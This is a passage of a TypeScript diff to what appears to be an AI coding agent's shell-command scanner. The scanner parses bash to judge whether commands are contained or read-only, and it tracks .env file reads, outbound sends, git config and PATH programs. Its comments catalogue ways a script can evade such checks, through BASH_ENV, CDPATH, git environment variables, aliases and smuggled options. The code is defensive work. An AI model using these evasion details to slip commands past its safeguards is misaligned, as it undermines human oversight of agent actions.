+      const tasks = firstOption === -1 ? rest : rest.slice(0, firstOption);
+      return tasks.length > 0 && tasks.every(devTask) && !rest.some(arg => TURBO_REMOTE.test(arg));
+    }
+    case 'node': {
+      const script = args.findIndex(arg => !arg.startsWith('-'));
+      const options = script === -1 ? args : args.slice(0, script);
+      if (!options.every(option => NODE_FLAGS.test(option))) return false;
+      return script === -1 ? options.includes('--test') : staysInFolder(args[script]);
+    }
+    default:
+      return false;
+  }
+}
+
+/** `pnpm exec vitest`, `npx tsc`: the tool after an optional `--`, with no options of the runner's own. */
+function execTool(args: readonly string[]): boolean {
+  return devTool(args[0] === '--' ? args.slice(1) : args);
+}
+
+function packageTask(manager: string, args: readonly string[]): boolean {
+  let at = 0;
+  while (at < args.length && args[at].startsWith('-')) {
+    const name = args[at].split('=')[0];
+    if (PACKAGE_VALUE_OPTIONS.includes(name)) at += args[at].includes('=') ? 1 : 2;
+    else if (PACKAGE_FLAGS.has(name)) at += 1;
+    else return false;
+  }
+  const [sub, ...rest] = args.slice(at);
+  if (sub === undefined) return false;
+  if (sub === 'exec' || (manager === 'npm' && sub === 'x')) return execTool(rest);
+  if (sub === 'run' || sub === 'run-script') return rest[0] !== undefined && devTask(rest[0]);
+  if (sub === 'test' || sub === 't' || sub === 'tst') return true;
+  // npm runs no script by its bare name; pnpm and yarn run the script, or else a local binary.
+  if (manager === 'npm') return false;
+  return devTool([sub, ...rest]) || devTask(sub);
+}
+
+/**
+ * Whether a command is an ordinary local test, typecheck, lint, format or build run: `vitest`,
+ * `jest`, `tsc`, `eslint`, `prettier`, a dev-task `turbo` pipeline or a `node` script inside the
+ * folder, directly or through `pnpm`/`npm`/`yarn`/`npx`, with no option that opens a port, reads a
+ * remote cache or installs a package. Only decides whether a tuning env prefix keeps the command
+ * coverable. It is NOT contained: these run code the project defines.
+ */
+function localToolchainCommand(raw: readonly string[]): boolean {
+  if (raw.length === 0 || raw.some(isDynamic)) return false;
+  const [program, ...args] = raw.map(unquote);
+  if (program === 'pnpm' || program === 'npm' || program === 'yarn') return packageTask(program, args);
+  if (program === 'npx') {
+    const start = args.findIndex(arg => !/^--(no-install|no|offline)$/.test(arg));
+    return start !== -1 && execTool(args.slice(start));
+  }
+  return devTool([program, ...args]);
 }
 
 /**
@@ -670,17 +6593,36 @@ export function containedCommand(raw: readonly string[]): boolean {
   const tokens = raw.map(unquote);
   const [program, ...args] = tokens;
   if (isDynamic(raw[0])) return false;
+  if (program === 'timeout') {
+    const command = timeoutCommand(raw.slice(1));
+    return command !== null && containedCommand(command);
+  }
+  if (program === 'set') return setOnlyChangesOptions(args);
+  if (program === 'sed') return readOnlySed(raw.slice(1));
   if (LOCAL_PROGRAMS.has(program)) {
-    if (program === 'sort') return !sortRunsOrWrites(args);
-    const runs = RUNS_A_PROGRAM[program];
-    return !runs || !args.some(arg => runs.test(arg));
+    if (program === 'sort') {
+      const options = optionStandIns(raw.slice(1), own(OPTION_FILES, program)?.valued ?? '');
+      return options !== null && !sortRunsOrWrites(options);
+    }
+    if (program === 'uniq') return uniqOutput(raw.slice(1)) === undefined;
+    const runs = own(RUNS_A_PROGRAM, program);
+    // A word bash may change is judged by its literal text, as tree reads `-Lo$X` as `-L` and `-o`, and while
+    // that text can still begin such an option (`-fpr$X` may be `-fprint`).
+    const runsAt = (word: string): boolean => {
+      const value = bashOption(word);
+      if (value !== null) return runs?.test(value) === true;
+      const { head } = literalHead(word);
+      const names = own(RUNS_A_PROGRAM_NAMES, program) ?? [];
+      return head.length <= 1 || runs?.test(head) === true || names.some(name => name.startsWith(head));
+    };
+    return !runs || !raw.slice(1).some(runsAt);
   }
   // A computed argument can carry what it read into the request path itself.
   if (program === 'gh') return !raw.slice(1).some(isDynamic) && readOnlyGh(args);
   return false;
 }
 
-function words(node: Node): string[] {
+export function words(node: Node): string[] {
   const out: string[] = [];
   for (const child of node.namedChildren) {
     if (!child || child.type === 'variable_assignment' || child.type.endsWith('redirect') || child.type === 'comment') {
@@ -691,132 +6633,2864 @@ function words(node: Node): string[] {
   return out;
 }
 
+/** Expressions in a `[` test, whose leaves are the words the `[` builtin is given. */
+const TEST_EXPRESSIONS = new Set([
+  'binary_expression',
+  'unary_expression',
+  'parenthesized_expression',
+  'ternary_expression',
+  'postfix_expression',
+]);
+
+/**
+ * The words of `node` bash brace-expands: a command's, a declaration's (`local x=...` too), an `unset`'s, a `[`
+ * test's, an array's, a for or select loop's list and a redirect target. Not a plain assignment, a here-string, a
+ * `case` word or pattern, or a `[[` test.
+ */
+function braceExpandedWords(node: Node): Node[] {
+  const named = node.namedChildren.filter((child): child is Node => child !== null && child.type !== 'comment');
+  // Iterative, in source order: a long `! ! ! x` or `-a` chain would overflow the stack if recursed.
+  const leaves = (root: Node): Node[] => {
+    const found: Node[] = [];
+    const pending: Node[] = [root];
+    for (let top = pending.pop(); top !== undefined; top = pending.pop()) {
+      if (!TEST_EXPRESSIONS.has(top.type)) {
+        found.push(top);
+        continue;
+      }
+      const children = top.namedChildren;
+      for (let at = children.length - 1; at >= 0; at--) {
+        const child = children[at];
+        if (child !== null && child !== undefined) pending.push(child);
+      }
+    }
+    return found;
+  };
+  switch (node.type) {
+    case 'command':
+      return named.filter(child => child.type !== 'variable_assignment' && !child.type.endsWith('redirect'));
+    case 'test_command':
+      return node.firstChild?.type === '[' ? named.flatMap(leaves) : [];
+    case 'declaration_command':
+    case 'unset_command':
+    case 'array':
+      return named;
+    case 'for_statement':
+      return node.childrenForFieldName('value').filter((child): child is Node => child !== null);
+    case 'file_redirect': {
+      const target = node.childForFieldName('destination');
+      return target ? [target] : [];
+    }
+    default:
+      return [];
+  }
+}
+
+/** Nodes whose assignments are already accounted for: a command's prefix, or a flagged declaration. */
+const ASSIGNMENT_OWNERS = new Set(['command', 'declaration_command', 'variable_assignments']);
+
+/**
+ * The home folder `~` and a bare `cd` reach, and the temp folders a command may use freely. A
+ * command in a WSL folder runs in Linux, so they are the distro user's: `home` is its Linux path,
+ * and the temp folder is on the share. When the distro cannot say (yet), `known` is false and
+ * `home` is the distro's root: a path built from it is not where the command will run, so
+ * `scanShell` gives no scan for a script that uses it.
+ */
+export async function shellHome(startDirectory: string): Promise<{ home: string; known: boolean; temp: string[] }> {
+  const wsl = wslLocation(startDirectory);
+  if (!wsl)
+    return { home: homedir(), known: true, temp: [tmpdir(), '/tmp', '/private/tmp', '/var/tmp', '/private/var/tmp'] };
+  const user = await wslUserEnvironment(wsl.distro);
+  return { home: user?.home ?? '/', known: !!user, temp: [wslUncPath(wsl, '/tmp')] };
+}
+
+/** `join`, `basename` and `dirname` for operands of a command in `cwd`: Linux ones in a WSL folder. */
+const operandRules = (cwd: string) => (wslLocation(cwd) ? posix : { join, basename, dirname });
+
+/**
+ * A program a WSL command runs through Windows interop: one named as Windows runs it, or any file
+ * on a Windows drive, since interop runs a Windows executable by its content whatever its name.
+ */
+const WINDOWS_PROGRAM = /\.(exe|com|bat|cmd)$|^\/mnt\/[A-Za-z]\//i;
+
+/** A path in a WSL distro that none of `roots` is in. */
+export function inUngrantedDistro(path: string, roots: readonly string[]): boolean {
+  const distro = wslLocation(path)?.distro.toLowerCase();
+  return distro !== undefined && !roots.some(root => wslLocation(root)?.distro.toLowerCase() === distro);
+}
+
+/**
+ * Where an operand itself sits, a final link unfollowed: its parent's physical path plus its name.
+ * `rm`, `mv`, `ln -sf` and `unlink` act on the link, not its target. Throws when a parent cannot be resolved.
+ */
+async function ownPlaces(
+  operand: string,
+  cwd: string,
+  roots: readonly string[],
+  reader: OperandReader = 'program'
+): Promise<string[]> {
+  const rules = reader === 'windows' ? win32 : operandRules(cwd);
+  const name = rules.basename(operand);
+  if (name === '' || name === '.' || name === '..') return [];
+  const places: string[] = [];
+  for (const { lexical, physical } of await operandPlaces(rules.dirname(operand), roots, cwd, reader)) {
+    if (inUngrantedDistro(lexical, roots) || (physical === null && onAnotherComputer(lexical))) continue;
+    if (physical === null) throw new PathAccessDenied(operand);
+    places.push(join(physical, name));
+  }
+  return places;
+}
+
 /**
  * Every simple command a shell script would run, and every directory outside the project it
- * names. Null when the script does not parse, which the caller treats as a reason to ask.
+ * names. Null when the script does not parse; the caller decides by what the text names.
  *
  * `cd`, `pushd` and `popd` move the directory later commands resolve against, except inside a
  * subshell, a `$( )` or a pipeline, where the shell discards the move. An argument built from a
  * variable or a command substitution is skipped, as opencode does: it cannot be read off the
  * text, and a `cd` to one leaves the tracked directory where it was.
  */
-/** Nodes whose assignments are already accounted for: a command's prefix, or a flagged declaration. */
-const ASSIGNMENT_OWNERS = new Set(['command', 'declaration_command', 'variable_assignments']);
-
 export async function scanShell(
   command: string,
   startDirectory: string,
-  roots: readonly string[]
+  roots: readonly string[],
+  deadlineMs = wslLocation(startDirectory) === null ? SCAN_DEADLINE_MS : WSL_SCAN_DEADLINE_MS
 ): Promise<ShellScan | null> {
+  // The shell gets a lone surrogate as U+FFFD, a character the scan would never compare against.
+  if (command.length > MAX_SCRIPT || !command.isWellFormed()) return null;
   const tree = await parseBash(command);
   if (!tree) return null;
 
-  try {
-    const temp = [tmpdir(), '/tmp', '/private/tmp'];
+  let expired = false;
+  const stopped = (): boolean => expired;
+  const scanning = withGrantedRoots(roots, async (): Promise<ShellScan | null> => {
+    const { home, known: homeKnown, temp } = await shellHome(startDirectory);
+    let homeGuessed = false;
+    const expand = (text: string): string => {
+      const expanded = expandHome(text, home);
+      if (!homeKnown && expanded !== text) homeGuessed = true;
+      return expanded;
+    };
     const allowed = [...roots, ...temp];
     const commands: ShellCommand[] = [];
     const paths = new Set<string>([await realpathNearest(startDirectory)]);
+    const globFolders = new Set<string>();
+    const dotlessGlobFolders = new Set<string>();
+    // Bash removes quotes and backslashes before it reads a name, so the name gates read the script without them.
+    const gateText = command.replace(/[\\'"]/g, '');
+    const variables = scriptVariables(tree.rootNode);
+    const anyName = rebindsAnyName(tree.rootNode, command, gateText, variables);
+    // bash -c runs BASH_ENV first, which may set any shell option or export any variable.
+    const bashEnv = (process.env.BASH_ENV ?? '') !== '';
+    const dotGlob = anyName || MAY_SET_DOTGLOB.test(gateText) || /dotglob/.test(process.env.BASHOPTS ?? '') || bashEnv;
+    // nullglob drops a pattern with no match, leaving git no pathspec and find no start point; globstar lets `**`
+    // match no folder at all; nocaseglob folds case as the locale does.
+    const globOptions =
+      anyName ||
+      /shopt|BASHOPTS|nullglob|globstar|nocaseglob/.test(gateText) ||
+      /nullglob|globstar|nocaseglob/.test(process.env.BASHOPTS ?? '') ||
+      bashEnv;
+    // Links `ln -s` makes in this script, in guard form: the scan cannot follow one that does not exist yet.
+    const createdLinks = new Set<string>();
+    // Folders whose `.claude` holds settings this session may load: its own and each shared root's.
+    const settingsBases = await Promise.all([startDirectory, ...roots].map(base => realpathNearest(base)));
+    // What the scan cannot follow. A count `claimUnread` gives to the one part that caused it asks about that part;
+    // any other leaves no command of the script coverable.
+    // Bash joins a word across a backslash-newline that the parser splits, so such a script reads nothing for sure.
+    let unreadOperands = /\S\\\r?\n\S/.test(command) ? 1 : 0;
+    if (anyName) unreadOperands++;
+    let claimedUnread = 0;
+    // Open `run`/`visitRedirected` calls: a nested one's reads belong to the outermost, which claims them whole.
+    let unreadOwners = 0;
+    // A part run after a directory change the scan lost acts somewhere unknown, so its script cannot be split.
+    let ranLost = false;
+    if (
+      ARITHMETIC.test(gateText) &&
+      SUBSCRIPT_SUBSTITUTION.test(gateText) &&
+      quotedSubstitution(tree.rootNode, command)
+    ) {
+      unreadOperands++;
+    }
+    if (splitAtDollar(tree.rootNode)) unreadOperands++;
+    // A `cd` that CDPATH may redirect lands somewhere the scan cannot tell.
+    const cdPath = anyName || /CDPATH/.test(gateText) || process.env.CDPATH !== undefined;
+    // Nesting depth of conditionals, loops and function bodies: a directory change there may not happen.
+    let branching = 0;
+    // Statements that are a side of an `&&`/`||` list, whose failure visitList accounts for.
+    const listMembers = new Set<number>();
+    // Directory changes seen so far, so a function body that changes directory loses the folder wherever it runs.
+    let directoryChanges = 0;
+    let gitProgram: string | null = null;
+    // Set when git may run a git-<name> program from a PATH entry the scan cannot place; auto mode asks.
+    let pathUnplaced = false;
+    // A sourced file may have changed PATH, the folder or the config git reads, which the scan does not read out of it.
+    let sourced = false;
+    const mkdirIds = new Set<number>();
+    // Copies that bring no `.git` along, so a folder they make is no repository.
+    const plainCopies = new Set<number>();
+    const rebound = anyName || REBINDS_HOME.test(gateText);
+    const user = loginName();
+    const loopBindings = new Map<string, LoopBinding>();
+    // Plain top-level `NAME=literal` assignments, bound in walk order so only later words see them.
+    const literalBindings = new Map<string, string>();
+    // git settings the script or this process may hand git, so what it reports from a folder is not what the scan asks.
+    const gitEnvironment =
+      anyName ||
+      variableNames(/GIT_/).test(gateText) ||
+      ['GIT_DIR', 'GIT_WORK_TREE', 'GIT_INDEX_FILE', 'GIT_COMMON_DIR'].some(name => process.env[name] !== undefined);
+    const terminalOutput =
+      TERMINAL_OUTPUT.test(gateText) ||
+      tree.rootNode.descendantsOfType('file_redirect').some(redirect => redirect !== null && redirectsStdout(redirect));
+    const programEnvironment = (node: Node, tokens: readonly string[], runsString = false): boolean =>
+      setsGitVariable(
+        variables.set.filter(setting => {
+          const name = setting.name.replace(/\[[^]*$/, '');
+          if (branching === 0 && !setting.uncertainOrder && setting.startIndex > node.endIndex) return false;
+          if (runsString) return true;
+          if (variableNames(PAGER_VARIABLE).test(name)) {
+            if (!terminalOutput) return opensPager(tokens, state.cwd);
+            return name !== 'PAGER' || usesGitFallback(name, tokens, state.cwd);
+          }
+          if (variableNames(EDITOR_VARIABLE).test(name)) return usesGitFallback(name, tokens, state.cwd);
+          return true;
+        })
+      );
+    // Pathspec settings the scan's own git never reads: icase and glob widen what a pathspec matches, literal reads
+    // magic as a name, and noglob only narrows.
+    const widenedPathspecs =
+      anyName ||
+      bashEnv ||
+      variableNames(/GIT_(ICASE|GLOB)_PATHSPECS/).test(gateText) ||
+      gitEnvTrue('GIT_ICASE_PATHSPECS') ||
+      gitEnvTrue('GIT_GLOB_PATHSPECS');
+    const literalPathspecs =
+      anyName ||
+      bashEnv ||
+      variableNames(/GIT_LITERAL_PATHSPECS/).test(gateText) ||
+      gitEnvTrue('GIT_LITERAL_PATHSPECS');
+    /** Whether the command's git matches `written` as the scan's git does, or within that. */
+    const pathspecsKept = (written: readonly string[]): boolean =>
+      written.length === 0 || !(widenedPathspecs || (literalPathspecs && written.some(spec => spec.startsWith(':'))));
+    // Where `git rev-parse --show-toplevel` lands from each folder; filled in only while git reads no GIT_* setting.
+    const toplevels = new Map<string, string | null>();
+    const readsToplevel = /rev-parse/.test(gateText) && !gitEnvironment;
+    const gitScript: GitScript = { staged: [], unknownIndex: false };
+    // The aliases git reads, by folder; see gitAliasExpansion.
+    const gitAliasLists = new Map<string, Promise<GitAliases | null>>();
+    // Settings that move which config git reads aliases from, or drop the shell's safe.bareRepository, away from the scan's.
+    const unsetsConfig = unsetsGitConfig(tree.rootNode, gateText);
+    const aliasEnvironment =
+      anyName ||
+      variables.set.some(({ name }) => variableNames(ALIAS_VARIABLE).test(name.replace(/\[[^]*$/, ''))) ||
+      unsetsConfig ||
+      ['GIT_DIR', 'GIT_WORK_TREE', 'GIT_INDEX_FILE', 'GIT_COMMON_DIR'].some(name => process.env[name] !== undefined) ||
+      Object.keys(process.env).some(name => /^GIT_CONFIG/i.test(name));
+    // Every folder the scan has been in, which `$PWD` in a PATH entry may name; filled in as commands are read.
+    const visited = new Set<string>([startDirectory]);
+    /**
+     * The folders the script puts on PATH, as host paths, and whether an entry could not be placed (a substitution,
+     * a folder the scan lost track of). `$HOME`, `~` and `$PWD` are read where the scan has been.
+     */
+    const scriptPathEntries = (): { entries: string[]; unplaced: boolean } => {
+      const entries: string[] = [];
+      let unplaced = false;
+      const hosted = sep === '/' && wslLocation(state.cwd) === null;
+      for (const { name, value } of variables.set) {
+        if (!variableNames(/^PATH$/).test(name.replace(/\[[^]*$/, ''))) continue;
+        if (value === undefined) continue;
+        if (value === null || name.includes('[') || !hosted) {
+          unplaced = true;
+          continue;
+        }
+        for (const raw of value.split(':')) {
+          if (raw === '$PATH' || raw === '${PATH}') continue;
+          const pwd = /^(\$(\{PWD\}|PWD)|\$\(\s*pwd\s*\)|`\s*pwd\s*`)(?=\/|$)/.exec(raw);
+          const base = /^(\$(\{HOME\}|HOME)|~)(?=\/|$)/.exec(raw);
+          let candidates: string[] | null = [raw];
+          if (pwd) candidates = state.lost ? null : [...visited].map(folder => folder + raw.slice(pwd[0].length));
+          else if (base) candidates = rebound || !homeKnown ? null : [home + raw.slice(base[0].length)];
+          if (candidates === null || candidates.some(entry => !/^[\w@%+=,./-]*$/.test(entry))) {
+            unplaced = true;
+            continue;
+          }
+          for (const entry of candidates) entries.push(posix.isAbsolute(entry) ? entry : under(state.cwd, entry));
+        }
+      }
+      return { entries, unplaced };
+    };
+    // A command run in the background with `&` or `coproc` may race any other, so an alias read is checked against all.
+    const backgrounded =
+      tree.rootNode.descendantsOfType('&').length > 0 ||
+      tree.rootNode.descendantsOfType('command_name').some(name => name?.text === 'coproc');
+    // Writes alias reads are checked against: a path, none for any config, or `unlisted` (counts when a config place
+    // lies in the roots). A `removal` takes a tree away (rm, a mv source) and makes no config of its own.
+    const configWrites: { id: number; path?: string; tree?: boolean; unlisted?: boolean; removal?: boolean }[] = [];
+    // `git config` calls that set a key no signing query reads: they leave configWrites for the signing checks.
+    const plainConfigWriters = new Set<number>();
+    const gitCommands = new Set<number>();
+    let writer: number | null = null;
+    const aliasChecks: {
+      signing?: true;
+      own: number;
+      anywhere: boolean;
+      alongside: ReadonlySet<number>;
+      cwd: string;
+      places: readonly string[] | null;
+      /** PATH folders in the project (guard form), where a written git-<name> program would run in place of an alias. */
+      folders: readonly string[];
+      /** Only programs matter: a git-merge-<name> lookup, which reads no config. */
+      programs: boolean;
+      legacy: boolean;
+    }[] = [];
+    // Functions this script defines anywhere, which a loop body may call before the scan reaches the definition.
+    const functions = new Set(
+      tree.rootNode
+        .descendantsOfType('function_definition')
+        .map(definition => definition?.childForFieldName('name')?.text ?? '')
+        .filter(name => name !== '')
+    );
+    // Under lastpipe the last part of a pipeline runs in this shell, so a cd there moves it.
+    const lastpipe = /lastpipe|shopt[^;&|\n]*[{}]/.test(gateText);
+    // `set -P` makes every later cd resolve links first; read for the whole script, wherever it sits.
+    const physicalShell = /\bset\b[^;&|\n]*(\s-[A-Za-z]*P|\bphysical\b)/.test(gateText);
     const directories = new Set<string>();
+    const ungranted = new Set<string>();
     const envFiles = new Set<string>();
     const outbound = new Set<string>();
+    let potentialOutbound = false;
+    const sends: ShellScan['sends'] = [];
+    let setsEnvironment = false;
     const writtenCommands = new Set<number>();
-    let contained = true;
+    const writes = new Set<string>();
+    const writtenTrees = new Set<string>();
+    // Commands that write, or may change what git or a walk lists, in the order read; see `trusted`.
+    const touchedBy: number[] = [];
+    const laterChecks: { own: ReadonlySet<number>; anywhere: boolean; alongside: ReadonlySet<number> }[] = [];
+    let readOnly = true;
+    // What each command names, and whether it only reads; a writer's places, cwd included, go to `writtenPlaces`.
+    let part: { places: string[]; reads: boolean } | null = null;
+    const writtenPlaces = new Set<string>();
+    const addPath = (path: string): void => {
+      paths.add(path);
+      part?.places.push(path);
+    };
+    let remoteTree = false;
 
-    const noteEnvFile = (raw: string): void => {
-      const path = expandHome(unquote(raw));
-      if (isDynamic(path)) return;
-      if (globPrefix(path) === path ? isEnvFile(path) : globMayMatchEnvFile(path)) envFiles.add(path);
+    const noteEnvFile = (raw: string): string | null => {
+      const path = expand(unquote(raw));
+      if (isDynamic(path)) return null;
+      if (!(globPrefix(path) === path ? isEnvFile(path) : globMayMatchEnvFile(path))) return null;
+      envFiles.add(path);
+      return path;
     };
 
-    const check = async (raw: string, cwd: string): Promise<string | null> => {
-      const prefix = globPrefix(expandHome(unquote(raw)));
-      if (!prefix || isDynamic(prefix)) return null;
-      try {
-        const physical = await resolveWithinRootsPhysically(prefix, allowed, cwd);
-        paths.add(physical);
-        return physical;
-      } catch {
-        const target = resolve(cwd, prefix);
-        paths.add(target);
-        paths.add(await realpathNearest(target));
-        const isDirectory = (await stat(target).catch(() => null))?.isDirectory() === true;
-        directories.add(isDirectory ? target : dirname(target));
-        return target;
+    const claimUnread = (before: number, entry: ShellCommand | null): void => {
+      if (unreadOwners > 0 || unreadOperands === before || !entry) return;
+      entry.unread = true;
+      claimedUnread += unreadOperands - before;
+    };
+
+    const scope = (): WordScope => {
+      const shellPath = (path: string): string => wslLocation(path)?.linuxPath ?? path;
+      return {
+        home,
+        cwd: shellPath(state.cwd),
+        previous: shellPath(state.previous),
+        lost: state.lost,
+        rebound,
+        user,
+        bindings: loopBindings,
+        assigned: literalBindings,
+        toplevel: state.lost ? null : (toplevels.get(state.cwd) ?? null),
+        homeUsed: () => {
+          if (!homeKnown) homeGuessed = true;
+        },
+      };
+    };
+
+    /**
+     * Why git, run with `args` (its words after `git`) by the command `tokens`, runs a form gitTable does not list or
+     * contacts a remote the scan cannot check; the programs a listed form looks up on PATH go through checkPathPrograms.
+     */
+    const ordinaryGitReason = (reason: string): GitReason => ({ kind: 'unlisted', reason });
+    const signingGitReason = (reason: string): GitReason => ({ kind: 'signing', reason });
+    const gitUnlistedReason = async (
+      node: Node,
+      tokens: readonly string[],
+      args: readonly string[]
+    ): Promise<GitReason | null> => {
+      const feeds = xargsFeeds(tokens) !== null;
+      const replace = feeds ? xargsReplace(tokens) : null;
+      const [first = '', ...rest] = withoutWrappers(tokens);
+      const fill =
+        replace !== null
+          ? { placeholder: replace, prefix: '' }
+          : programName(unquote(first)) === 'find'
+            ? { placeholder: '{}', prefix: findStart(rest) }
+            : undefined;
+      for (const words of gitCalls(args, scope(), fill)) {
+        // xargs adds the words it reads after the ones it was given.
+        const listing = gitListed(feeds && replace === null ? [...words, OPEN_GIT_WORD] : words);
+        const own = commandSigning(words);
+        const signs = (keys: readonly string[]): readonly string[] => keys.filter(key => !own?.off.includes(key));
+        const output = listing.listed ? listing.signatureFormat : own?.format;
+        const explicit =
+          own?.text ?? (formatVerifies(output) ? 'with an output format that may verify signatures' : undefined);
+        if (!listing.listed) {
+          const named = unlistedSigning(words);
+          if (named === null) return ordinaryGitReason(listing.reason);
+          if (explicit !== undefined) return signingGitReason(`${named.form} ${explicit}`);
+          const signing = await signingReason(named.form, signs(named.signs), words, node, output);
+          return signing?.asks ? signingGitReason(`${named.form} ${signing.text}`) : ordinaryGitReason(listing.reason);
+        }
+        const folder = gitFolder(words);
+        const programs = [...listing.programs, ...(listing.contacts ? ['ssh'] : [])];
+        if (programs.length > 0) await checkPathPrograms(node, folder ?? state.cwd, programs);
+        if (explicit !== undefined) return signingGitReason(`${listing.form} ${explicit}`);
+        // Read before the user config checks, which give a reason that does not ask.
+        const signing = await signingReason(listing.form, signs(listing.signs), words, node, output);
+        if (signing?.asks) return signingGitReason(`${listing.form} ${signing.text}`);
+        const moved = movedUserConfig(node, folder);
+        if (moved === null) return ordinaryGitReason(`${listing.form} with a user config the scan cannot place`);
+        if (moved.length > 0) {
+          if (programs.length > 0) return ordinaryGitReason(`${listing.form} with HOME or XDG_CONFIG_HOME set`);
+          const reason = await userConfigReason(node, folder as string, moved);
+          if (reason !== null) return ordinaryGitReason(`${listing.form} ${reason}`);
+        }
+        if (signing !== null) return ordinaryGitReason(`${listing.form} ${signing.text}`);
+        if (listing.contacts === undefined) continue;
+        if (folder === null || sourced || aliasEnvironment || dropsGitConfig(tokens)) {
+          return ordinaryGitReason(`${listing.form} with a remote in config the scan cannot read`);
+        }
+        if (!(await configSettled(node, folder))) {
+          return ordinaryGitReason(`${listing.form} after a config change in the same script`);
+        }
+        if (!(await remotesPlain(folder, listing.contacts))) {
+          return ordinaryGitReason(`${listing.form} with a remote git reaches through a program of its own`);
+        }
       }
+      return null;
     };
 
-    const state = { cwd: startDirectory, previous: startDirectory, stack: [] as string[] };
+    /** The folder git runs in for a call with `words` (those after `git`); null when the scan cannot place its repository. */
+    const gitFolder = (words: readonly GitWord[]): string | null => {
+      if (state.lost) return null;
+      let folder = state.cwd;
+      for (let at = 0; at < words.length; at++) {
+        const { text } = words[at] as GitWord;
+        if (!text.startsWith('-')) break;
+        if (/^--(git-dir|work-tree)(=|$)/.test(text)) return null;
+        if (text === '-C') {
+          const value = words[++at];
+          if (value === undefined || !value.whole) return null;
+          folder = resolveOperand(folder, value.text);
+        } else if (text === '-c' || text === '--config-env') {
+          at++;
+        }
+      }
+      return folder;
+    };
+
+    /** The `GitSigningCall` of git run with `words`, and the folder it runs in; null when the scan cannot place either. */
+    const gitPlace = (words: readonly GitWord[]): { folder: string; call: Omit<GitSigningCall, 'env'> } | null => {
+      if (state.lost) return null;
+      let folder = state.cwd;
+      let gitDir: string | null = null;
+      let workTree: string | null = null;
+      const settings: string[] = [];
+      for (let at = 0; at < words.length; at++) {
+        const { text, whole } = words[at] as GitWord;
+        if (!text.startsWith('-')) break;
+        const joined = text.indexOf('=') !== -1;
+        const name = joined ? text.slice(0, text.indexOf('=')) : text;
+        if (!GIT_GLOBAL_VALUES.has(name)) continue;
+        const value = joined ? undefined : words[++at];
+        const named = value ?? { text: text.slice(name.length + 1), whole };
+        if (!named.whole) return null;
+        if (name === '-C') folder = resolveOperand(folder, named.text);
+        else if (name === '--git-dir') gitDir = named.text;
+        else if (name === '--work-tree') workTree = named.text;
+        else settings.push(...(joined ? [text] : [name, named.text]));
+      }
+      return { folder, call: { gitDir, workTree, settings } };
+    };
+
+    const signingConfigs = new Map<string, Promise<ConfigEntry[] | null>>();
+    let droppedEnvironment: boolean | undefined;
+    const prettyConfigs = new Map<string, Promise<ConfigEntry[] | null>>();
+    // Commands that may change what a later config query reads: a repository made, a branch or worktree switched, a
+    // cd into a folder not there yet.
+    const historyChanges = new Map<number, Set<HistoryChange>>();
+    let deferredSigningRisk = false;
+    const historyChecks: {
+      own: number;
+      anywhere: boolean;
+      alongside: ReadonlySet<number>;
+      configs: boolean;
+      form: string;
+      reason: (kinds: ReadonlySet<HistoryChange>) => Promise<SigningFinding | null>;
+    }[] = [];
+    // Each part by the node that runs it, and its text as written, for a racing signing check to mark.
+    const entries = new Map<number, { entry: ShellCommand; original: string }>();
+    const onBranchIncludes = new Map<string, Promise<'none' | 'some' | null>>();
+    const freshLocations = new Map<string, Promise<{ folder: string; call: GitSigningCall } | null>>();
+
+    const noteHistory = (id: number, kind: HistoryChange): void => {
+      const kinds = historyChanges.get(id);
+      if (kinds === undefined) historyChanges.set(id, new Set([kind]));
+      else kinds.add(kind);
+    };
+
+    /** The kinds of change made by the statements `counts` picks. */
+    const changesOf = (counts: (id: number) => boolean): Set<HistoryChange> =>
+      new Set([...historyChanges].flatMap(([id, kinds]) => (counts(id) ? [...kinds] : [])));
+
+    /** What git run with `raw` (the words after `git`), whose subcommand and operands are `git`, may change for a later config query. */
+    const gitHistoryChange = (
+      git: { sub: string; rest: readonly string[]; unread?: true },
+      raw: readonly string[]
+    ): HistoryChange | null => {
+      if (git.unread) return 'any';
+      const change = historyChange(git.sub, git.rest);
+      if (change !== 'place') return change;
+      const at = gitSubcommandAt(raw);
+      const options = typeof at === 'number' ? raw.slice(0, at) : null;
+      const plain =
+        options !== null &&
+        !gitAliasMoved(options) &&
+        !options.some(word => /^(-c|--config-env.*)$/.test(wordValue(word)));
+      return plain ? 'place' : 'any';
+    };
+
+    /**
+     * The environment a signing query gets: the script's `env`, and each variable a `--config-env` in `settings` names
+     * with the value the script or this process gives it; null when one has none the scan can place.
+     */
+    const configEnvironment = (
+      node: Node,
+      settings: readonly string[],
+      env: Record<string, string>
+    ): Record<string, string> | null => {
+      const set = new Map(Object.entries(env));
+      for (let at = 0; at < settings.length; at++) {
+        const word = settings[at] as string;
+        const spec =
+          word === '--config-env' ? settings[++at] : word.startsWith('--config-env=') ? word.slice(13) : undefined;
+        if (spec === undefined) continue;
+        const name = spec.includes('=') ? spec.slice(spec.indexOf('=') + 1) : '';
+        if (!/^[A-Za-z_]\w*$/.test(name) || SCRIPT_GIT_ENVIRONMENT.test(name)) return null;
+        const exact = new RegExp(`^${name}$`);
+        // Nothing tracks an unset, so a script that unsets this name, or one by expansion, hands git no value.
+        if (new RegExp(`\\b(unset|export\\s+-n)\\b[^;&|\\n]*(\\b${name}\\b|[$\`])`).test(tree.rootNode.text))
+          return null;
+        const assigned = assignedValues(node, exact);
+        const elsewhere = assigned.some(({ prefixOf }) => prefixOf !== undefined && prefixOf !== node.startIndex);
+        // A prefix assignment on a function's command may reach this call through the function.
+        if (elsewhere && inFunctionBody(node)) return null;
+        const found = assigned.filter(({ prefixOf }) => prefixOf === undefined || prefixOf === node.startIndex);
+        const values = new Set(found.map(({ value, certain }) => (certain && value !== null ? value : null)));
+        let value: string | undefined;
+        if (found.length === 0) {
+          // A name the script only exports, unsets or assigns later may not hold what this process gives it.
+          const named = variables.set.some(setting => variableNames(exact).test(setting.name.replace(/\[[^]*$/, '')));
+          value = named ? undefined : own(process.env as Record<string, string>, name);
+        } else if (values.size === 1) {
+          const [only] = values;
+          value = only !== null && only !== undefined && !/[$`~]/.test(only) ? only : undefined;
+        }
+        if (value === undefined) return null;
+        set.set(name, value);
+      }
+      return Object.fromEntries(set);
+    };
+
+    /** `folder`, or the nearest folder above it that exists. */
+    const nearestFolder = async (folder: string): Promise<string> => {
+      for (let near = folder; dirname(near) !== near; near = dirname(near)) {
+        if ((await stat(near).catch(() => null))?.isDirectory()) return near;
+      }
+      return folder;
+    };
+
+    /** Whether git run with `words` sets a signing key by `-c` or `--config-env` to a value the scan may not read. */
+    const signingSettingOpen = (words: readonly GitWord[]): boolean => {
+      for (let at = 0; at < words.length; at++) {
